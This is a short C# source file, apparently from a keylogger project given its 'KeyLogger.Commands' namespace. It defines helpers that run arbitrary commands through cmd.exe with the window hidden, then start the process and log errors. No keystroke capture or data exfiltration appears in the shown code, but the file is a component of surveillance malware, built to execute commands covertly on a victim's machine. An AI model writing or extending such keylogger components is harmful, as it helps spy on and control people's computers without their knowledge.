using System;
using System.Diagnostics;

namespace KeyLogger.Commands
{
    public static class CommandExtensions
    {
        public static Process PrepareCmdProcess(string command)
        {
            var process = new Process();
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = $"/C {command}";
            return process;
        }

        public static void RunProcess(Process process, Action<Process> pipeline = null)
        {
            try
            {
                pipeline ??= p => p.Start();
                pipeline(process);
            }
            catch (Exception ex)
            {
                Logger.LogException(ex);
            }
        }
    }
}